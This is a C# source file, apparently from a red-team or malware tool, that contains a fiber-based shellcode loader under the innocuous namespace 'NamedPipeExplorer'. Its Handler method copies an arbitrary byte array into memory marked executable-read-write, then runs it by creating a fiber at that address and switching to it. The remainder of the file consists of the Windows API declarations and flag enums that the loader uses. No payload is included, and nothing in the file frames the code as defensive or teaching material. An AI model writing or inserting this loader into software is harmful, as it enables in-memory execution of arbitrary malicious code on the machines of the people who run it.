using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace NamedPipeExplorer
{
    internal class FiberHandler
    {
        public static void Handler(byte[] dataframe)
        {
            IntPtr mainFiber = ConvertThreadToFiber(IntPtr.Zero);

            var hMemory = VirtualAlloc(
                IntPtr.Zero,
                (uint)dataframe.Length,
                VIRTUAL_ALLOCATION_TYPE.MEM_COMMIT | VIRTUAL_ALLOCATION_TYPE.MEM_RESERVE,
                PAGE_PROTECTION_FLAGS.PAGE_EXECUTE_READWRITE);

            WriteProcessMemory(
                new IntPtr(-1),
                hMemory,
                dataframe,
                (uint)dataframe.Length,
                out _);

            IntPtr subprocFiber = CreateFiber(0, hMemory, IntPtr.Zero);

            SwitchToFiber(subprocFiber);

            return;
        }

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        VIRTUAL_ALLOCATION_TYPE flAllocationType,
        PAGE_PROTECTION_FLAGS flProtect);

        [DllImport("KERNEL32.dll", ExactSpelling = true, SetLastError = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            uint nSize,
            out uint lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr ConvertThreadToFiber(IntPtr lpParameter);

        [DllImport("kernel32.dll")]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern IntPtr CreateFiber(uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);

        [DllImport("KERNEL32.dll", ExactSpelling = true)]
        [DefaultDllImportSearchPaths(DllImportSearchPath.System32)]
        public static extern void SwitchToFiber(IntPtr lpFiber);

        [Flags]
        public enum VIRTUAL_ALLOCATION_TYPE : uint
        {
            MEM_COMMIT = 0x00001000,
            MEM_RESERVE = 0x00002000,
            MEM_RESET = 0x00080000,
            MEM_RESET_UNDO = 0x01000000,
            MEM_REPLACE_PLACEHOLDER = 0x00004000,
            MEM_LARGE_PAGES = 0x20000000,
            MEM_RESERVE_PLACEHOLDER = 0x00040000,
            MEM_FREE = 0x00010000,
        }

        [Flags]
        public enum PAGE_PROTECTION_FLAGS : uint
        {
            PAGE_NOACCESS = 0x00000001,
            PAGE_READONLY = 0x00000002,
            PAGE_READWRITE = 0x00000004,
            PAGE_WRITECOPY = 0x00000008,
            PAGE_EXECUTE = 0x00000010,
            PAGE_EXECUTE_READ = 0x00000020,
            PAGE_EXECUTE_READWRITE = 0x00000040,
            PAGE_EXECUTE_WRITECOPY = 0x00000080,
            PAGE_GUARD = 0x00000100,
            PAGE_NOCACHE = 0x00000200,
            PAGE_WRITECOMBINE = 0x00000400,
            PAGE_GRAPHICS_NOACCESS = 0x00000800,
            PAGE_GRAPHICS_READONLY = 0x00001000,
            PAGE_GRAPHICS_READWRITE = 0x00002000,
            PAGE_GRAPHICS_EXECUTE = 0x00004000,
            PAGE_GRAPHICS_EXECUTE_READ = 0x00008000,
            PAGE_GRAPHICS_EXECUTE_READWRITE = 0x00010000,
            PAGE_GRAPHICS_COHERENT = 0x00020000,
            PAGE_GRAPHICS_NOCACHE = 0x00040000,
            PAGE_ENCLAVE_THREAD_CONTROL = 0x80000000,
            PAGE_REVERT_TO_FILE_MAP = 0x80000000,
            PAGE_TARGETS_NO_UPDATE = 0x40000000,
            PAGE_TARGETS_INVALID = 0x40000000,
            PAGE_ENCLAVE_UNVALIDATED = 0x20000000,
            PAGE_ENCLAVE_MASK = 0x10000000,
            PAGE_ENCLAVE_DECOMMIT = 0x10000000,
            PAGE_ENCLAVE_SS_FIRST = 0x10000001,
            PAGE_ENCLAVE_SS_REST = 0x10000002,
            SEC_PARTITION_OWNER_HANDLE = 0x00040000,
            SEC_64K_PAGES = 0x00080000,
            SEC_FILE = 0x00800000,
            SEC_IMAGE = 0x01000000,
            SEC_PROTECTED_IMAGE = 0x02000000,
            SEC_RESERVE = 0x04000000,
            SEC_COMMIT = 0x08000000,
            SEC_NOCACHE = 0x10000000,
            SEC_WRITECOMBINE = 0x40000000,
            SEC_LARGE_PAGES = 0x80000000,
            SEC_IMAGE_NO_EXECUTE = 0x11000000,
        }
    }
}
